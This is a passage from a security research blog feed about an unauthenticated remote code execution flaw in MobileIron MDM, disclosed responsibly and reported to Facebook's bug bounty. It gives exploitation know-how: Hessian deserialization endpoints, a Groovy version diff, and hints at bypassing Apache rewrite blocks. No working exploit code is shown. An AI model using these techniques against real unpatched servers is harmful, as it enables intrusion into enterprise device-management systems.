  &lt;p&gt;Cannot restore Groovyâ€™s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;A question quickly came up in my mind: Why did the author leave this word here? Although it failed with exceptions, there must have been something special so that the author write this down.&lt;/p&gt;

&lt;p&gt;Our target is running with a very old Groovy, so we are guessing that the &lt;code class=&quot;highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; constrain might not have been applied to the code base yet! We compared the file &lt;code class=&quot;highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; between the latest and 1.5.6.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yes, we are right. There is no &lt;code class=&quot;highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; in Groovy 1.5.6, and we later learned &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; is just for that. Itâ€™s a mitigation for the rising Java deserialization vulnerability in 2015. Since Groovy is an internally used library, developers wonâ€™t update it if there is no emergency. The outdated Groovy could also be a good case study to demonstrated how a harmless component can leave you compromised!&lt;/p&gt;

&lt;p&gt;Of course we got the shell on Facebook in the end. Here is the video:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;vulnerability-report-and-patch&quot;&gt;Vulnerability Report and Patch&lt;/h2&gt;

&lt;p&gt;We have done all the research on March and sent the advisory to MobileIron at 4/3. The MobileIron released the patch on 6/15 and addressed three CVEs for that. You can check the &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;official website&lt;/a&gt; for details!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the patch has been released, we start monitoring the Internet to track the overall fixing progress. Here we check the &lt;code class=&quot;highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; header on static files so that the result is just for your information. (Unknown stands for the server closed both 443 and 8443 ports)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, we keep our attentions on Facebook as well. With 15 days no-patch confirm, we finally popped a shell and report to their Bug Bounty program at 7/2!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;So far, we have demonstrated a completely unauthenticated RCE on MobileIron. From how we get the firmware, find the vulnerability, and bypass the JNDI mitigation and network limitation. There are other stories, but due to the time, we have just listed topics here for those who are interested:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How to take over the employeesâ€™ devices from MDM&lt;/li&gt;
  &lt;li&gt;Disassemble the MI Protocol&lt;/li&gt;
  &lt;li&gt;And the CVE-2020-15506, an interesting authentication bypass&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope this article could draw attention to MDM and the importance of enterprise security! Thanks for reading. :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>çœ‹æˆ‘å¦‚ä½•å†ä¸€æ¬¡é§­é€² Facebookï¼Œä¸€å€‹åœ¨ MobileIron MDM ä¸Šçš„é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œæ¼æ´!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å—¨! å¥½ä¹…ä¸è¦‹ï¼Œé€™æ˜¯æˆ‘åœ¨ä»Šå¹´å¹´åˆçš„ç ”ç©¶ï¼Œè¬›è¿°å¦‚ä½•å°‹æ‰¾ä¸€æ¬¾çŸ¥åè¡Œå‹•è£ç½®ç®¡ç†ç”¢å“çš„æ¼æ´ï¼Œä¸¦ç¹éå±¤å±¤ä¿è­·å–å¾—é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œçš„æ•…äº‹! å…¶ä¸­çš„æ¼æ´ç¶“å›å ±å¾Œåœ¨å…­æœˆç”±å®˜æ–¹é‡‹å‡ºä¿®è£œç¨‹å¼ä¸¦ç·Šæ€¥é€šçŸ¥ä»–å€‘çš„å®¢æˆ¶ï¼Œè€Œæˆ‘å€‘ä¹Ÿåœ¨ä¿®è£œç¨‹å¼é‡‹å‡º 15 å¤©å¾Œç™¼ç¾ Facebook ä¸¦æœªåŠæ™‚æ›´æ–°ï¼Œå› æ­¤é€éæ¼æ´å–å¾—ä¼ºæœå™¨æ¬Šé™ä¸¦å›å ±çµ¦ Facebook!&lt;/p&gt;

&lt;p&gt;æ­¤ä»½ç ”ç©¶åŒæ™‚ç™¼è¡¨æ–¼ &lt;a href=&quot;https://hitcon.org/2020/&quot;&gt;HITCON 2020&lt;/a&gt;ï¼Œä½ å¯ä»¥å¾&lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;é€™è£¡&lt;/a&gt;å–å¾—é€™æ¬¡æ¼”è¬›çš„æŠ•å½±ç‰‡!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;èº«ç‚ºä¸€å€‹å°ˆæ¥­çš„ç´…éšŠï¼Œæˆ‘å€‘ä¸€ç›´åœ¨å°‹æ‰¾è‘—æ›´å¿«é€Ÿå¯ä»¥å¾å¤–éƒ¨é€²å…¥ä¼æ¥­å…§ç¶²çš„æœ€ä½³é€”å¾‘! å¦‚åŒæˆ‘å€‘å»å¹´åœ¨ &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; ç™¼è¡¨çš„ç ”ç©¶ï¼ŒSSL VPN ç†æ‰€ç•¶ç„¶æœƒæ”¾åœ¨å¤–éƒ¨ç¶²è·¯ï¼Œæˆç‚ºä¿è­·è‘—ç¶²è·¯å®‰å…¨ã€ä½¿å“¡å·¥é€²å…¥å…§éƒ¨ç¶²è·¯çš„åŸºç¤è¨­æ–½ï¼Œè€Œç•¶ä½ æ‰€ä¿¡ä»»ã€ä¸¦ä¸”ç”¨ä¾†ä¿è­·ä½ å®‰å…¨çš„è¨­å‚™ä¸å†å®‰å…¨äº†ï¼Œä½ è©²æ€éº¼è¾¦?&lt;/p&gt;

&lt;p&gt;ç”±æ­¤ç‚ºç™¼æƒ³ï¼Œæˆ‘å€‘é–‹å§‹å°‹æ‰¾è‘—æœ‰æ²’æœ‰æ–°çš„ä¼æ¥­ç¶²è·¯è„†å¼±é»å¯ç•¶æˆæˆ‘å€‘ç´…éšŠæ”»æ“Šæ»²é€ä¼æ¥­çš„åˆå§‹é€²å…¥é»ï¼Œåœ¨èª¿æŸ¥çš„éç¨‹ä¸­æˆ‘å€‘å° MDM/UEM é–‹å§‹ç”¢ç”Ÿäº†èˆˆè¶£ï¼Œè€Œé€™ç¯‡æ–‡ç« å°±æ˜¯å¾æ­¤ç™¼å±•å‡ºä¾†çš„ç ”ç©¶æˆæœ!&lt;/p&gt;

&lt;h2 id=&quot;ä»€éº¼æ˜¯-mdmuem-&quot;&gt;ä»€éº¼æ˜¯ MDM/UEM ?&lt;/h2&gt;

&lt;p&gt;Mobile Device Managementï¼Œç°¡ç¨± MDMï¼Œç´„æ˜¯åœ¨ 2012 å¹´é–“ï¼Œå€‹äººæ‰‹æ©Ÿã€å¹³æ¿è£ç½®é–‹å§‹èˆˆèµ·æ™‚ï¼Œç‚ºäº†ä½¿ä¼æ¥­æ›´å¥½çš„ç®¡ç†å“¡å·¥çš„ &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD è£ç½®&lt;/a&gt;ï¼Œæ‡‰é‹è€Œç”Ÿçš„è³‡ç”¢ç›¤é»ç³»çµ±ï¼Œä¼æ¥­å¯ä»¥é€é MDM ç”¢å“ï¼Œç®¡ç†å“¡å·¥çš„è¡Œå‹•è£ç½®ï¼Œç¢ºä¿è£ç½®åªåœ¨ä¿¡ä»»çš„ç’°å¢ƒã€æ”¿ç­–ä¸‹é‹è¡Œï¼Œä¹Ÿå¯ä»¥å¾ä¸­å¿ƒçš„ç«¯é»ä¼ºæœå™¨ï¼Œé‡å°æ‰€æ§åˆ¶çš„æ‰‹æ©Ÿï¼Œéƒ¨ç½²æ‡‰ç”¨ç¨‹å¼ã€å®‰è£æ†‘è­‰ç”šè‡³é ç«¯æ“æ§ä»¥ç®¡ç†ä¼æ¥­è³‡ç”¢ï¼Œæ›´å¯ä»¥åœ¨è£ç½®éºå¤±æ™‚ï¼Œé€é MDM é ç«¯ä¸Šé–ï¼Œæˆ–æ˜¯æŠ¹é™¤æ•´å°è£ç½®è³‡æ–™é”åˆ°ä¼æ¥­éš±ç§ä¸å¤–æ¼çš„ç›®çš„!&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) å‰‡ç‚ºè¿‘å¹¾å¹´ä¾†æ›´æ–°çš„ä¸€å€‹è¡“èªï¼Œå…¶æ ¸å¿ƒçš†ç‚ºè¡Œå‹•è£ç½®çš„ç®¡ç†ï¼Œåªæ˜¯ UEM ä¸€è©åŒ…å«æ›´å»£çš„è£ç½®å®šç¾©! æˆ‘å€‘ä»¥ä¸‹çš†ç”¨ MDM ä¸€è©ä¾†ä»£æŒ‡åŒé¡ç”¢å“ã€‚&lt;/p&gt;

&lt;h2 id=&quot;æˆ‘å€‘çš„ç›®æ¨™&quot;&gt;æˆ‘å€‘çš„ç›®æ¨™&lt;/h2&gt;

&lt;p&gt;MDM ä½œç‚ºä¸€å€‹ä¸­å¿ƒåŒ–çš„ç«¯é»æ§åˆ¶ç³»çµ±ï¼Œå¯ä»¥æ§åˆ¶ã€ä¸¦ç®¡ç†æ——ä¸‹æ‰€æœ‰å“¡å·¥å€‹äººè£ç½®! å°æ—¥ç›Šå£¯å¤§çš„ä¼æ¥­ä¾†èªªï¼Œçµ•å°æ˜¯ä¸€å€‹æœ€ä½³çš„è³‡ç”¢ç›¤é»ç”¢å“ï¼Œç›¸å°çš„ï¼Œå°é§­å®¢ä¾†èªªä¹Ÿæ˜¯! è€Œç‚ºäº†ç®¡ç†ä¾†è‡ªä¸–ç•Œå„åœ°çš„å“¡å·¥è£ç½®é€£ç·šï¼ŒMDM åˆå‹¢å¿…å¾—æ›éœ²åœ¨å¤–ç¶²ã€‚ ä¸€å€‹å¯ä»¥ã€Œç®¡ç†å“¡å·¥è£ç½®ã€åˆã€Œæ”¾ç½®åœ¨å¤–ç¶²ã€çš„è¨­å‚™ï¼Œé€™å°æˆ‘å€‘çš„ç´…éšŠæ¼”ç·´ä¾†èªªç„¡ç–‘æ˜¯æœ€æ£’çš„æ»²é€ç®¡é“!&lt;/p&gt;

&lt;p&gt;å¦å¤–ï¼Œå¾é€™å¹¾å¹´çš„å®‰å…¨è¶¨å‹¢ä¹Ÿä¸é›£ç™¼ç¾ MDM é€æ¼¸æˆç‚ºé§­å®¢ã€APT çµ„ç¹”çš„é¦–é¸ç›®æ¨™! èª˜ä½¿å—å®³è€…åŒæ„æƒ¡æ„çš„ MDM æˆç‚ºä½ è£ç½®çš„ C&amp;amp;C ä¼ºæœå™¨ï¼Œæˆ–æ˜¯ä¹¾è„†å…¥ä¾µä¼æ¥­æ”¾ç½®åœ¨å¤–ç¶²çš„ MDM è¨­å‚™ï¼Œåœ¨æ‰¹æ¬¡åœ°æ´¾é€è¡Œå‹•è£ç½®æœ¨é¦¬æ„ŸæŸ“æ‰€æœ‰ä¼æ¥­å“¡å·¥æ‰‹æ©Ÿã€é›»è…¦ï¼Œä»¥é”åˆ°é€²ä¸€æ­¥çš„æ”»æ“Š! é€™äº›éƒ½å·²æˆçœŸï¼Œè©³ç´°çš„å ±å‘Šå¯åƒé–± Cisco Talos åœ˜éšŠæ‰€ç™¼è¡¨çš„ &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Letâ€™s Hide This App&lt;/a&gt; ä»¥åŠ CheckPoint CPR åœ˜éšŠæ‰€ç™¼è¡¨çš„ &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;å¾å‰é¢çš„å¹¾å€‹æ¡ˆä¾‹æˆ‘å€‘å¾—çŸ¥ MDM å°æ–¼ä¼æ¥­å®‰å…¨ä¾†èªªï¼Œæ˜¯ä¸€å€‹å¾ˆå¥½çš„åˆ‡å…¥é»ï¼Œå› æ­¤æˆ‘å€‘é–‹å§‹ç ”ç©¶ç›¸é—œçš„æ”»æ“Šé¢! è€Œå¸‚é¢ä¸Š MDM å» å•†æœ‰éå¸¸å¤šï¼Œå„å€‹å¤§å» å¦‚ Microsoftã€IBM ç”šè‡³ Apple éƒ½æœ‰æ¨å‡ºè‡ªå·±çš„ MDM ç”¢å“ï¼Œæˆ‘å€‘è¦æŒ‘é¸å“ªå€‹é–‹å§‹æˆç‚ºæˆ‘å€‘çš„ç ”ç©¶å°è±¡å‘¢?&lt;/p&gt;

&lt;p&gt;å› æ­¤æˆ‘å€‘é€éå…¬é–‹æƒ…å ±åˆ—èˆ‰äº†å¸‚é¢ä¸Šå¸¸è¦‹çš„ MDM ç”¢å“ï¼Œä¸¦é…åˆå„å®¶ç‰¹å¾µå°å…¨ä¸–ç•Œé€²è¡Œäº†ä¸€æ¬¡æƒæï¼Œç™¼ç¾æœ€å¤šä¼æ¥­ä½¿ç”¨çš„ MDM ç‚º VMware AirWatch èˆ‡ MobileIron é€™å…©å¥—ç”¢å“! è‡³æ–¼è¦æŒ‘å“ªä¸€å®¶ç ”ç©¶å‘¢? æˆ‘å€‘é¸æ“‡äº†å¾Œè€…ï¼Œé™¤äº†è€ƒé‡åˆ°å¤§éƒ¨åˆ†çš„å®¢æˆ¶éƒ½æ˜¯ä½¿ç”¨ MobileIron å¤–ï¼Œå¦å¤–ä¸€å€‹å¸å¼•æˆ‘çš„é»å‰‡æ˜¯ Facebook ä¹Ÿæ˜¯ä»–å€‘çš„å®¢æˆ¶! å¾æˆ‘å€‘åœ¨ 2016 å¹´ç™¼è¡¨çš„ &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someoneâ€™s Backdoor Script&lt;/a&gt; ç ”ç©¶ä¸­ï¼Œå°±å·²ç™¼ç¾ Facebook ä½¿ç”¨ MobileIron ä½œç‚ºä»–å€‘çš„ MDM è§£æ±ºæ–¹æ¡ˆ!&lt;/p&gt;

&lt;p&gt;æ ¹æ“š MobileIron å®˜æ–¹ç¶²ç«™æè¿°ï¼Œè‡³å°‘æœ‰ 20000+ çš„ä¼æ¥­ä½¿ç”¨ MobileIron ç•¶æˆä»–å€‘çš„ MDM è§£æ±ºæ–¹æ¡ˆï¼Œè€Œæ ¹æ“šæˆ‘å€‘å¯¦éš›å°å…¨ä¸–ç•Œçš„æƒæï¼Œä¹Ÿè‡³å°‘æœ‰ 15% ä»¥ä¸Šçš„è²¡å¯Œä¸–ç•Œ 500 å¤§ä¼æ¥­ä½¿ç”¨ MobileIron ä¸”&lt;strong&gt;æ›éœ²åœ¨å¤–ç¶²&lt;/strong&gt;(å¯¦éš›ä¸Šä¸€å®šæ›´å¤š)ï¼Œå› æ­¤ï¼Œå°‹æ‰¾ MobileIron çš„æ¼æ´ä¹Ÿå°±è®Šæˆæˆ‘å€‘çš„é¦–è¦ç›®æ¨™!&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•é–‹å§‹ç ”ç©¶&quot;&gt;å¦‚ä½•é–‹å§‹ç ”ç©¶&lt;/h2&gt;

&lt;p&gt;å¾&lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;éå¾€å‡ºç¾éçš„æ¼æ´&lt;/a&gt;å¯ä»¥å¾—çŸ¥ MobileIron ä¸¦æ²’æœ‰å—åˆ°å¤ªå¤šå®‰å…¨äººå“¡ç ”ç©¶ï¼Œå…¶ä¸­åŸå› é™¤äº† MDM é€™å€‹æ”»æ“Šå‘é‡å°šæœªå»£ç‚ºäººçŸ¥å¤–ï¼Œå¦ä¸€å€‹å¯èƒ½æ˜¯å› ç‚ºé—œæ–¼ MobileIron çš„ç›¸é—œéŸŒé«”å¤ªé›£å–å¾—ï¼Œç ”ç©¶ä¸€æ¬¾è¨­å‚™æœ€å¤§çš„å•é¡Œæ˜¯å¦‚ä½•å¾ç´”ç²¹çš„é»‘ç®±ï¼Œåˆ°å¯ä»¥åˆ†æçš„ç°ç®±ã€ç”šè‡³ç™½ç®±! ç”±æ–¼ç„¡æ³•å¾å®˜ç¶²ä¸‹è¼‰éŸŒé«”ï¼Œæˆ‘å€‘èŠ±è²»äº†å¥½å¹¾å¤©å˜—è©¦è‘—å„ç¨®é—œéµå­—åœ¨ç¶²è·¯ä¸Šå°‹æ‰¾å¯åˆ©ç”¨çš„å…¬é–‹è³‡è¨Šï¼Œæœ€å¾Œæ‰åœ¨ Goolge Search ç´¢å¼•åˆ°çš„å…¶ä¸­ä¸€å€‹å…¬é–‹ç¶²ç«™æ ¹ç›®éŒ„ä¸Šç™¼ç¾ç–‘ä¼¼æ˜¯é–‹ç™¼å•†æ¸¬è©¦ç”¨çš„ RPM åŒ…ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸‹è¼‰å›çš„éŸŒé«”ç‚º 2018 å¹´åˆçš„ç‰ˆæœ¬ï¼Œé›¢ç¾åœ¨ä¹Ÿæœ‰å¾ˆé•·ä¸€æ®µæ™‚é–“ï¼Œä¹Ÿè¨±æ ¸å¿ƒç¨‹å¼ç¢¼ä¹Ÿå¤§æ”¹éï¼Œä¸éç¸½æ¯”ä»€éº¼éƒ½æ²’æœ‰å¥½ï¼Œå› æ­¤æˆ‘å€‘å°±å¾é€™ä»½æª”æ¡ˆé–‹å§‹ç ”ç©¶èµ·ã€‚&lt;/p&gt;

&lt;p&gt;&lt;em&gt;å‚™è¨»: ç¶“é€šçŸ¥ MobileIron å®˜æ–¹å¾Œï¼Œæ­¤é–‹ç™¼å•†ç¶²ç«™å·²é—œé–‰ã€‚&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;å¦‚ä½•å°‹æ‰¾æ¼æ´&quot;&gt;å¦‚ä½•å°‹æ‰¾æ¼æ´&lt;/h2&gt;

&lt;p&gt;æ•´å€‹ MobileIron ä½¿ç”¨ Java ä½œç‚ºä¸»è¦é–‹ç™¼èªè¨€ï¼Œå°å¤–é–‹æ”¾çš„é€£æ¥åŸ ç‚º 443, 8443, 9997ï¼Œå„å€‹é€£æ¥åŸ å°æ‡‰åŠŸèƒ½å¦‚ä¸‹:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;443 ç‚ºä½¿ç”¨è€…è£ç½®è¨»å†Šä»‹é¢&lt;/li&gt;
  &lt;li&gt;8443 ç‚ºè¨­å‚™ç®¡ç†ä»‹é¢&lt;/li&gt;
  &lt;li&gt;9997 ç‚ºä¸€å€‹ MobileIron ç§æœ‰çš„è£ç½®åŒæ­¥å”å®š (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä¸‰å€‹é€£æ¥åŸ çš†é€é TLS ä¿è­·é€£ç·šçš„å®‰å…¨æ€§åŠå®Œæ•´æ€§ï¼Œç¶²é éƒ¨åˆ†å‰‡æ˜¯é€é Apache çš„ Reverse Proxy æ¶æ§‹å°‡é€£ç·šå°è‡³å¾Œæ–¹ï¼Œç”± Tomcat éƒ¨ç½²çš„ç¶²é æ‡‰ç”¨è™•ç†ï¼Œç¶²é æ‡‰ç”¨å‰‡ç”± Spring MVC é–‹ç™¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ä½¿ç”¨çš„æŠ€è¡“æ¶æ§‹ç›¸å°æ–°ï¼Œå‚³çµ±é¡å‹çš„æ¼æ´å¦‚ SQL Injection ä¹Ÿè¼ƒé›£å¾å–®ä¸€çš„é»ä¾†ç™¼ç¾ï¼Œå› æ­¤ç†è§£ç¨‹å¼é‚è¼¯ä¸¦é…åˆæ¶æ§‹å±¤é¢çš„æ”»æ“Šå°±è®Šæˆæˆ‘å€‘é€™æ¬¡å°‹æ‰¾æ¼æ´çš„ä¸»è¦ç›®æ¨™!&lt;/p&gt;

&lt;p&gt;é€™æ¬¡çš„æ¼æ´ä¹Ÿå¾ˆç°¡å–®ï¼Œä¸»è¦æ˜¯ Web Service ä½¿ç”¨äº† Hessian æ ¼å¼è™•ç†è³‡æ–™é€²è€Œç”¢ç”Ÿäº†ååºåˆ—åŒ–çš„å¼±é»! é›–ç„¶æ¼æ´ä¸€å¥è©±å°±å¯ä»¥è§£é‡‹å®Œäº†ï¼Œä½†æ‡‚çš„äººæ‰çŸ¥é“ååºåˆ—åŒ–ä¸¦ä¸ä»£è¡¨ä½ å¯ä»¥åšä»»ä½•äº‹ï¼Œæ¥ä¸‹ä¾†çš„åˆ©ç”¨æ‰æ˜¯ç²¾å½©çš„åœ°æ–¹!&lt;/p&gt;

&lt;p&gt;ç¾åœ¨å·²çŸ¥ MobileIron åœ¨è™•ç† Web Service çš„åœ°æ–¹å­˜åœ¨ Hessian ååºåˆ—åŒ–æ¼æ´! ä½†æ¼æ´å­˜åœ¨ï¼Œä¸¦ä¸ä»£è¡¨æˆ‘å€‘ç¢°å¾—åˆ°æ¼æ´ï¼Œå¯ä»¥è§¸ç™¼ Hessian ååºåˆ—åŒ–çš„è·¯å¾‘åˆ†åˆ¥åœ¨:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢ - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;ç®¡ç†ä»‹é¢ - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://mobileiron:8443/mifs/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç®¡ç†ä»‹é¢åŸºæœ¬ä¸Šæ²’æœ‰ä»»ä½•é˜»æ“‹ï¼Œå¯ä»¥è¼•é¬†çš„ç¢°åˆ° Web Serviceï¼Œè€Œä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢çš„ Web Service å‰‡ç„¡æ³•å­˜å–ï¼Œé€™å°æˆ‘å€‘ä¾†èªªæ˜¯ä¸€å€‹è‡´å‘½æ€§çš„æ‰“æ“Šï¼Œç”±æ–¼å¤§éƒ¨åˆ†ä¼æ¥­çš„ç¶²è·¯æ¶æ§‹ä¸¦ä¸æœƒå°‡ç®¡ç†ä»‹é¢çš„é€£æ¥åŸ é–‹æ”¾åœ¨å¤–éƒ¨ç¶²è·¯ï¼Œå› æ­¤åªèƒ½æ”»æ“Šç®¡ç†ä»‹é¢å°æ–¼çš„åˆ©ç”¨ç¨‹åº¦ä¸¦ä¸å¤§ï¼Œå› æ­¤æˆ‘å€‘å¿…é ˆå°‹æ‰¾å…¶ä»–çš„æ–¹å¼å»è§¸ç™¼é€™å€‹æ¼æ´!&lt;/p&gt;

&lt;p&gt;ä»”ç´°è§€å¯Ÿ MobileIron çš„é˜»æ“‹æ–¹å¼ï¼Œç™¼ç¾å®ƒæ˜¯é€éåœ¨ Apache ä¸Šä½¿ç”¨ Rewrite Rules å»é˜»æ“‹å°ä¸€èˆ¬ä½¿ç”¨è€…ä»‹é¢ Web Service çš„å­˜å–:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å—¯ï¼Œå¾ˆæ£’! ä½¿ç”¨ Reverse Proxy æ¶æ§‹è€Œä¸”æ˜¯åœ¨å‰é¢é‚£å±¤åšé˜»æ“‹ï¼Œä½ æ˜¯å¦æƒ³åˆ°ä»€éº¼å‘¢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

